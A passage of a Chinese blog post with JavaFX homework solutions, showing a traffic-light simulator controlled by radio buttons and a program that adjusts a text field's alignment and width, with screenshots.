        <span class="token function">setValues</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/piKWhhF.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/11/02/piKWhhF.png'">
<h2 id="编写一个程序来模拟交通信号灯-程序可以让用户从红-黄-绿三种顔色灯中选择一种-当选择一个单选按钮后相应的灯被打开并且一次只能亮一种灯-程序开始时所有的灯都是不亮的"><a class="markdownIt-Anchor" href="#编写一个程序来模拟交通信号灯-程序可以让用户从红-黄-绿三种顔色灯中选择一种-当选择一个单选按钮后相应的灯被打开并且一次只能亮一种灯-程序开始时所有的灯都是不亮的"></a> 编写一个程序来模拟交通信号灯。程序可以让用户从红、黄、绿三种顔色灯中选择一种。当选择一个单选按钮后，相应的灯被打开，并且一次只能亮一种灯。程序开始时所有的灯都是不亮的</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>geometry<span class="token punctuation">.</span></span><span class="token class-name">Insets</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>geometry<span class="token punctuation">.</span></span><span class="token class-name">Pos</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>paint<span class="token punctuation">.</span></span><span class="token class-name">Color</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Circle</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Rectangle</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TrafficLight</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> pStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span><span class="token function">getPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"Traffic Light"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        pStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">BorderPane</span> <span class="token function">getPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">BorderPane</span> borderPane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BorderPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">HBox</span> hBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">RadioButton</span> rbRed <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RadioButton</span><span class="token punctuation">(</span><span class="token string">"Red"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">RadioButton</span> rbYellow <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RadioButton</span><span class="token punctuation">(</span><span class="token string">"Yellow"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">RadioButton</span> rbGreen <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RadioButton</span><span class="token punctuation">(</span><span class="token string">"Green"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>rbRed<span class="token punctuation">,</span> rbYellow<span class="token punctuation">,</span> rbGreen<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 让面板内的节点居中对齐</span>
        hBox<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 设置每个节点的间距</span>
        hBox<span class="token punctuation">.</span><span class="token function">setSpacing</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 设置节点和面板之间的间距</span>
        hBox<span class="token punctuation">.</span><span class="token function">setPadding</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Insets</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ToggleGroup</span> group <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToggleGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        rbRed<span class="token punctuation">.</span><span class="token function">setToggleGroup</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">;</span>
        rbYellow<span class="token punctuation">.</span><span class="token function">setToggleGroup</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">;</span>
        rbGreen<span class="token punctuation">.</span><span class="token function">setToggleGroup</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">StackPane</span> stackPane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StackPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">GridPane</span> gridPane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GridPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Rectangle</span> rec <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Rectangle</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        rec<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">TRANSPARENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        rec<span class="token punctuation">.</span><span class="token function">setStroke</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">BLACK</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Circle</span> red <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Circle</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        red<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">TRANSPARENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        red<span class="token punctuation">.</span><span class="token function">setStroke</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">BLACK</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Circle</span> yellow <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Circle</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        yellow<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">TRANSPARENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        yellow<span class="token punctuation">.</span><span class="token function">setStroke</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">BLACK</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Circle</span> green <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Circle</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        green<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">TRANSPARENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        green<span class="token punctuation">.</span><span class="token function">setStroke</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">BLACK</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        gridPane<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        gridPane<span class="token punctuation">.</span><span class="token function">setVgap</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        gridPane<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>red<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        gridPane<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>yellow<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        gridPane<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>green<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        stackPane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>gridPane<span class="token punctuation">,</span> rec<span class="token punctuation">)</span><span class="token punctuation">;</span>

        rbRed<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            yellow<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">TRANSPARENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            green<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">TRANSPARENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            red<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">RED</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        rbYellow<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            green<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">TRANSPARENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            red<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">TRANSPARENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            yellow<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">YELLOW</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        rbGreen<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            yellow<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">TRANSPARENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            red<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">TRANSPARENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            green<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">GREEN</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        borderPane<span class="token punctuation">.</span><span class="token function">setCenter</span><span class="token punctuation">(</span>stackPane<span class="token punctuation">)</span><span class="token punctuation">;</span>
        borderPane<span class="token punctuation">.</span><span class="token function">setBottom</span><span class="token punctuation">(</span>hBox<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> borderPane<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/piKW27V.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/11/02/piKW27V.png'">
<h2 id="编写一个程序动态地设置文本域的水平对齐属性和列宽厲性"><a class="markdownIt-Anchor" href="#编写一个程序动态地设置文本域的水平对齐属性和列宽厲性"></a> 编写一个程序，动态地设置文本域的水平对齐属性和列宽厲性</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>geometry<span class="token punctuation">.</span></span><span class="token class-name">Insets</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>geometry<span class="token punctuation">.</span></span><span class="token class-name">Pos</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DynamicTextarea</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> pStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span><span class="token function">getPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"Dynamic Textarea"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        pStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">VBox</span> <span class="token function">getPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">VBox</span> vBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VBox</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        vBox<span class="token punctuation">.</span><span class="token function">setPadding</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Insets</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">HBox</span> hBox1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hBox1<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">TextField</span> textField1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Label</span> lbTextField1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"Text Field"</span><span class="token punctuation">,</span> textField1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        lbTextField1<span class="token punctuation">.</span><span class="token function">setContentDisplay</span><span class="token punctuation">(</span><span class="token class-name">ContentDisplay</span><span class="token punctuation">.</span><span class="token constant">RIGHT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        hBox1<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>lbTextField1<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">HBox</span> hBox2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hBox2<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hBox2<span class="token punctuation">.</span><span class="token function">setPadding</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Insets</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ToggleGroup</span> group <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToggleGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">RadioButton</span> left <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RadioButton</span><span class="token punctuation">(</span><span class="token string">"Left"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        left<span class="token punctuation">.</span><span class="token function">setToggleGroup</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">;</span>
        left<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> textField1<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER_LEFT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">RadioButton</span> center <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RadioButton</span><span class="token punctuation">(</span><span class="token string">"Center"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        center<span class="token punctuation">.</span><span class="token function">setToggleGroup</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">;</span>
        center<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> textField1<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">RadioButton</span> right <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RadioButton</span><span class="token punctuation">(</span><span class="token string">"Right"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        right<span class="token punctuation">.</span><span class="token function">setToggleGroup</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">;</span>
        right<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> textField1<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER_RIGHT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">TextField</span> textField2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 使用TextFormatter来处理输入，避免非数字输入</span>
        textField2<span class="token punctuation">.</span><span class="token function">setTextFormatter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TextFormatter</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>change <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>change<span class="token punctuation">.</span><span class="token function">isContentChange</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> change<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">String</span> text <span class="token operator">=</span> change<span class="token punctuation">.</span><span class="token function">getControlNewText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> text<span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token string">"\\d*"</span><span class="token punctuation">)</span> <span class="token operator">?</span> change <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 回车键更新文本框宽度</span>
        textField2<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token keyword">int</span> width <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>textField2<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                textField1<span class="token punctuation">.</span><span class="token function">setPrefWidth</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NumberFormatException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 输入为空时不做处理</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Label</span> lbTextField2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"Column Size"</span><span class="token punctuation">,</span> textField2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        lbTextField2<span class="token punctuation">.</span><span class="token function">setContentDisplay</span><span class="token punctuation">(</span><span class="token class-name">ContentDisplay</span><span class="token punctuation">.</span><span class="token constant">RIGHT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        hBox2<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> center<span class="token punctuation">,</span> right<span class="token punctuation">,</span> lbTextField2<span class="token punctuation">)</span><span class="token punctuation">;</span>

        vBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>hBox1<span class="token punctuation">,</span> hBox2<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> vBox<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/piKWWkT.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/11/02/piKWWkT.png'">
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>作业</tag>
      </tags>
